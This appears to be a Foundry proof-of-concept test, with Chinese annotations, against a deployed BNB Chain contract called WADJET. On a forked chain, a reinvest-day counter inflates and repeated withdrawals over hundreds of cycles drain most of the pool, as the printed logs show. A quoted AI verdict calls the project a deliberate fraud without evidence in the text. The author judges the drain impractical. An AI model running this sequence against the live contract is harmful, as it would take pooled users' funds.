// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;
import {Test, console} from "forge-std/Test.sol";
import {WADJET} from "../src/WADJET.sol";

contract  AttackBSCPoC is Test{
    WADJET public wadjet;
    address constant TARGET_ADDRESS = 0x4ef1dCFDcF8F4B99deBa2567c4110B06b649Ae0f;
    address constant TARGET_USER = 0x0Cda6B956366a5e60Dc18960c67712707771BC3f;  // 幸运用户（也许就是攻击者）
    address internal Alice;

    function setUp() public {
        vm.createSelectFork(vm.envString("RPC_URL"), 90388834);
        wadjet = WADJET(payable(TARGET_ADDRESS));
        Alice = makeAddr("Alice");
        // On a fork, a deterministic test address may collide with a deployed contract.
        // withdraw() uses transfer (2300 gas), so receiver must be EOA-like (no fallback code).
        if (Alice.code.length != 0) {
            vm.etch(Alice, hex"");
        }
        vm.deal(Alice, 20 ether);
    }

    function test_Attack_BSCchain() public {
        address ref = wadjet.devAddress();
        
        vm.prank(Alice);
        wadjet.deposit{value: 10 ether}(ref);
        
        vm.prank(Alice);    // Alice 第一次定投
        wadjet.reinvest();

        // 查询池子的余额看看
        uint256 PoolBalance = wadjet.getBalance();
        console.log("Pool Balance is: ", PoolBalance);

        // 挑选一位链上幸运用户
        // 读取其定投天数
        vm.prank(TARGET_USER);
        uint256[] memory luckyUserData = wadjet.getContractData(TARGET_USER);
        console.log("Lucky user's reinvest days: ", luckyUserData[8]);   // 定投天数为0
        console.log("Lucky user's balance: ", TARGET_USER.balance);  // 原生代币余额：2945781520600110

        // 读取 Alice 的的定投天数
        vm.prank(Alice);
        uint256[] memory AliceData = wadjet.getContractData(Alice);
        console.log("Before Alice reinvest days: ", AliceData[8]);


        // Alice 定投 20 天
        uint256 startTime = block.timestamp;
        for(uint256 i = 1; i < 20; i++){
            vm.warp(startTime + i * 1 days);
            vm.prank(Alice);
            wadjet.reinvest();
        }
        
        vm.warp(startTime + 20 days);

        vm.prank(Alice);
        wadjet.canWithdraw(Alice);


        // 查看 Alice 的定投天数
        AliceData = wadjet.getContractData(Alice);
        console.log("After Alice reinvest days: ", AliceData[8]);

        // Alice 提款前的余额
        console.log("Alice before balance: ", Alice.balance);

        // 提款
        vm.prank(Alice);
        wadjet.withdraw();

        // Alice 提款后的余额
        console.log("Alice after balance: ", Alice.balance);


        // 多轮周期，抽空池子
        uint256 maxRound = 800;
        uint256 cycleStart = startTime + 20 days;
        uint256 completedRounds = 0;
        uint256 firstFailedRound = 0;
        bool stoppedByCanWithdraw = false;
        for(uint256 round = 0; round < maxRound; round ++){
            vm.warp(cycleStart);
            vm.prank(Alice);
            wadjet.reinvest();

            for(uint256 i = 1; i < 20; i++){
                vm.warp(cycleStart + i * 1 days);
                vm.prank(Alice);
                wadjet.reinvest();
            }
            vm.warp(cycleStart + 20 days);
            vm.prank(Alice);
            bool canW = wadjet.canWithdraw(Alice);
            if (!canW) {
                firstFailedRound = round + 1;
                stoppedByCanWithdraw = true;
                break;
            }

            vm.prank(Alice);
            (bool ok, ) = address(wadjet).call(abi.encodeWithSignature("withdraw()"));
            if (!ok) {
                firstFailedRound = round + 1;
                break;
            }

            completedRounds = round + 1;
            cycleStart = cycleStart + 20 days;
        }
        console.log("After more rounds: ");
        console.log("Balance of Alice final: ", Alice.balance);
        console.log("Balance of Pool final: ", wadjet.getBalance());
        console.log("completed rounds: ", completedRounds);
        console.log("first failed round: ", firstFailedRound);
        console.log("stopped by canWithdraw(1=yes): ", stoppedByCanWithdraw ? 1 : 0);
    }

}

最终结果：
Logs:
  Pool Balance is:  36196927234917583513
  Lucky user's reinvest days:  0
  Lucky user's balance:  2945781520600110
  Before Alice reinvest days:  1
  After Alice reinvest days:  1048575
  Alice before balance:  10000000000000000000
  Alice after balance:  10046724439831279659
  After more rounds: 
  Balance of Alice final:  37941215019105236082
  Balance of Pool final:  37707798428456717
  completed rounds:  597
  first failed round:  598
  stopped by canWithdraw(1=yes):  0

claude给出的结论：
该合约是一个经过精心设计的欺诈性智能合约。
reset() 公开函数并非开发失误，而是项目方用于阻止用户提现的蓄意后门。
结合五个手续费地址的自动抽水机制和链上已证实的攻击行为，可以判断该合约从设计之初就以欺骗用户资金为目的，
属于典型的链上金融诈骗。

结论：
该合约的reset完全偏向于项目方，攻击者不可用，无法套利，运行结果显示掏空池子需要598轮
大约32年的时间，盈利大约 17 BNB